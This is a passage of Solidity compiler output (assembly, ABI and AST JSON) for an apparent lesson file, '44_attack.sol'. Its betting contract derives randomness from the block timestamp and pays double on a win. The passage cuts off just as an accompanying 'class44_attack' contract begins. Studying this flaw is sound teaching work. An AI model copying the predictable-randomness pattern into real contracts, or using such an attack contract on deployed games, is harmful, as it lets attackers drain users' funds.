											"begin": 365,
											"end": 398,
											"name": "MSTORE"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 207,
											"name": "KECCAK256"
										},
										{
											"begin": 158,
											"end": 207,
											"name": "SWAP1"
										},
										{
											"begin": 158,
											"end": 207,
											"name": "POP"
										},
										{
											"begin": 239,
											"end": 243,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 229,
											"end": 235,
											"name": "DUP2"
										},
										{
											"begin": 224,
											"end": 236,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 224,
											"end": 236,
											"name": "SWAP1"
										},
										{
											"begin": 224,
											"end": 236,
											"name": "DIV"
										},
										{
											"begin": 224,
											"end": 243,
											"name": "DUP2"
										},
										{
											"begin": 224,
											"end": 243,
											"name": "ISZERO"
										},
										{
											"begin": 224,
											"end": 243,
											"name": "ISZERO"
										},
										{
											"begin": 224,
											"end": 243,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 224,
											"end": 243,
											"name": "JUMPI"
										},
										{
											"begin": 224,
											"end": 243,
											"name": "INVALID"
										},
										{
											"begin": 224,
											"end": 243,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 224,
											"end": 243,
											"name": "JUMPDEST"
										},
										{
											"begin": 224,
											"end": 243,
											"name": "MOD"
										},
										{
											"begin": 217,
											"end": 243,
											"name": "SWAP2"
										},
										{
											"begin": 217,
											"end": 243,
											"name": "POP"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "POP"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "SWAP1"
										},
										{
											"begin": 101,
											"end": 250,
											"name": "JUMP",
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"get_random()": "98107e5b",
							"kk()": "3779c39e",
							"play()": "93e84cd9"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.4.24+commit.e67f0147\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":true,\"inputs\":[],\"name\":\"kk\",\"outputs\":[{\"name\":\"\",\"type\":\"int256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"play\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"get_random\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"\",\"type\":\"address\"}],\"name\":\"win\",\"type\":\"event\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"44_attack.sol\":\"class44_game\"},\"evmVersion\":\"byzantium\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"44_attack.sol\":{\"keccak256\":\"0x49c1c54773e32964655f27184735cf79087b1690aabed4e4648a84ab14e72228\",\"urls\":[\"bzzr://6815d201033f5d48d067fdc3c9d3216a7364436e29771e4d9b8ae683dd81a7ee\"]}},\"version\":1}",
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"sources": {
			"44_attack.sol": {
				"ast": {
					"absolutePath": "44_attack.sol",
					"exportedSymbols": {
						"class44_attack": [
							147
						],
						"class44_game": [
							86
						]
					},
					"id": 148,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.4",
								".24"
							],
							"nodeType": "PragmaDirective",
							"src": "0:24:0"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 86,
							"linearizedBaseContracts": [
								86
							],
							"name": "class44_game",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": null,
									"id": 5,
									"name": "win",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 4,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 3,
												"indexed": false,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 5,
												"src": "64:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "64:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "63:9:0"
									},
									"src": "54:19:0"
								},
								{
									"constant": false,
									"id": 8,
									"name": "kk",
									"nodeType": "VariableDeclaration",
									"scope": 86,
									"src": "78:16:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_int256",
										"typeString": "int256"
									},
									"typeName": {
										"id": 6,
										"name": "int",
										"nodeType": "ElementaryTypeName",
										"src": "78:3:0",
										"typeDescriptions": {
											"typeIdentifier": "t_int256",
											"typeString": "int256"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "31",
										"id": 7,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "93:1:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_rational_1_by_1",
											"typeString": "int_const 1"
										},
										"value": "1"
									},
									"visibility": "public"
								},
								{
									"body": {
										"id": 28,
										"nodeType": "Block",
										"src": "148:102:0",
										"statements": [
											{
												"assignments": [
													14
												],
												"declarations": [
													{
														"constant": false,
														"id": 14,
														"name": "ramdon",
														"nodeType": "VariableDeclaration",
														"scope": 29,
														"src": "158:14:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes32",
															"typeString": "bytes32"
														},
														"typeName": {
															"id": 13,
															"name": "bytes32",
															"nodeType": "ElementaryTypeName",
															"src": "158:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 21,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 18,
																	"name": "now",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 164,
																	"src": "202:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 16,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 149,
																	"src": "185:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 17,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodePacked",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "185:16:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function () pure returns (bytes memory)"
																}
															},
															"id": 19,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "185:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 15,
														"name": "keccak256",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 156,
														"src": "175:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_sha3_pure$__$returns$_t_bytes32_$",
															"typeString": "function () pure returns (bytes32)"
														}
													},
													"id": 20,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "175:32:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "158:49:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 26,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 23,
																"name": "ramdon",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 14,
																"src": "229:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes32",
																	"typeString": "bytes32"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_bytes32",
																	"typeString": "bytes32"
																}
															],
															"id": 22,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "224:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_uint256_$",
																"typeString": "type(uint256)"
															},
															"typeName": "uint"
														},
														"id": 24,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "224:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "31303030",
														"id": 25,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "239:4:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1000_by_1",
															"typeString": "int_const 1000"
														},
														"value": "1000"
													},
													"src": "224:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 12,
												"id": 27,
												"nodeType": "Return",
												"src": "217:26:0"
											}
										]
									},
									"documentation": null,
									"id": 29,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": true,
									"modifiers": [],
									"name": "get_random",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 9,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "120:2:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 12,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 11,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 29,
												"src": "143:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 10,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "143:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "142:6:0"
									},
									"scope": 86,
									"src": "101:149:0",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 62,
										"nodeType": "Block",
										"src": "287:184:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 36,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 33,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 162,
																	"src": "305:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 34,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "305:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "302e3031",
																"id": 35,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "318:10:0",
																"subdenomination": "ether",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_10000000000000000_by_1",
																	"typeString": "int_const 10000000000000000"
																},
																"value": "0.01"
															},
															"src": "305:23:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 32,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															165,
															166
														],
														"referencedDeclaration": 165,
														"src": "297:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 37,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "297:32:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 38,
												"nodeType": "ExpressionStatement",
												"src": "297:32:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 41,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 39,
														"name": "kk",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 8,
														"src": "339:2:0",
														"typeDescriptions": {
															"typeIdentifier": "t_int256",
															"typeString": "int256"
														}
													},
													"nodeType": "Assignment",
													"operator": "+=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 40,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "343:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "339:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"id": 42,
												"nodeType": "ExpressionStatement",
												"src": "339:5:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 46,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"arguments": [],
														"expression": {
															"argumentTypes": [],
															"id": 43,
															"name": "get_random",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 29,
															"src": "357:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_view$__$returns$_t_uint256_$",
																"typeString": "function () view returns (uint256)"
															}
														},
														"id": 44,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "357:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "353030",
														"id": 45,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "371:3:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_500_by_1",
															"typeString": "int_const 500"
														},
														"value": "500"
													},
													"src": "357:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 61,
												"nodeType": "IfStatement",
												"src": "354:111:0",
												"trueBody": {
													"id": 60,
													"nodeType": "Block",
													"src": "375:90:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "302e3032",
																		"id": 52,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "409:10:0",
																		"subdenomination": "ether",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_20000000000000000_by_1",
																			"typeString": "int_const 20000000000000000"
																		},
																		"value": "0.02"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_20000000000000000_by_1",
																			"typeString": "int_const 20000000000000000"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 47,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 162,
																			"src": "389:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 50,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sender",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "389:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	"id": 51,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "transfer",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "389:19:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
																		"typeString": "function (uint256)"
																	}
																},
																"id": 53,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "389:31:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 54,
															"nodeType": "ExpressionStatement",
															"src": "389:31:0"
														},
														{
															"eventCall": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 56,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 162,
																			"src": "443:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 57,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sender",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "443:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"id": 55,
																	"name": "win",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 5,
																	"src": "439:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_event_nonpayable$_t_address_$returns$__$",
																		"typeString": "function (address)"
																	}
																},
																"id": 58,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "439:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 59,
															"nodeType": "EmitStatement",
															"src": "434:20:0"
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"id": 63,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "play",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 30,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "269:2:0"
									},
									"payable": true,
									"returnParameters": {
										"id": 31,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "287:0:0"
									},
									"scope": 86,
									"src": "256:215:0",
									"stateMutability": "payable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 73,
										"nodeType": "Block",
										"src": "503:46:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 70,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 67,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 162,
																	"src": "521:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 68,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "521:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "31",
																"id": 69,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "534:7:0",
																"subdenomination": "ether",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1000000000000000000_by_1",
																	"typeString": "int_const 1000000000000000000"
																},
																"value": "1"
															},
															"src": "521:20:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 66,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															165,
															166
														],
														"referencedDeclaration": 165,
														"src": "513:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 71,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "513:29:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 72,
												"nodeType": "ExpressionStatement",
												"src": "513:29:0"
											}
										]
									},
									"documentation": null,
									"id": 74,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 64,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "486:2:0"
									},
									"payable": true,
									"returnParameters": {
										"id": 65,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "503:0:0"
									},
									"scope": 86,
									"src": "477:72:0",
									"stateMutability": "payable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 84,
										"nodeType": "Block",
										"src": "588:51:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 81,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 78,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 162,
																	"src": "606:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 79,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "606:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "31",
																"id": 80,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "619:7:0",
																"subdenomination": "ether",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1000000000000000000_by_1",
																	"typeString": "int_const 1000000000000000000"
																},
																"value": "1"
															},
															"src": "606:20:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 77,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															165,
															166
														],
														"referencedDeclaration": 165,
														"src": "598:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 82,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "598:29:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 83,
												"nodeType": "ExpressionStatement",
												"src": "598:29:0"
											}
										]
									},
									"documentation": null,
									"id": 85,
									"implemented": true,
									"isConstructor": true,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 75,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "571:2:0"
									},
									"payable": true,
									"returnParameters": {
										"id": 76,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "588:0:0"
									},
									"scope": 86,
									"src": "559:80:0",
									"stateMutability": "payable",
									"superFunction": null,
									"visibility": "public"
								}
							],
							"scope": 148,
							"src": "26:615:0"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 147,
							"linearizedBaseContracts": [
								147
							],
							"name": "class44_attack",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 89,
									"name": "game",
									"nodeType": "VariableDeclaration",
									"scope": 147,
									"src": "673:64:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 87,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "673:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "307835423338446136613730316335363835343564436663423033466342383735663536626564644334",
										"id": 88,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "695:42:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										},
										"value": "0x5B38Da6a701c568545dCfcB03FcB875f56beddC4"
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 94,
									"name": "gamecontract",
									"nodeType": "VariableDeclaration",
									"scope": 147,
									"src": "744:46:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_class44_game_$86",
										"typeString": "contract class44_game"
									},
									"typeName": {
										"contractScope": null,
										"id": 90,
										"name": "class44_game",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 86,
										"src": "744:12:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_class44_game_$86",
											"typeString": "contract class44_game"
										}
									},
									"value": {
										"argumentTypes": null,
										"arguments": [
											{
												"argumentTypes": null,
												"id": 92,
												"name": "game",
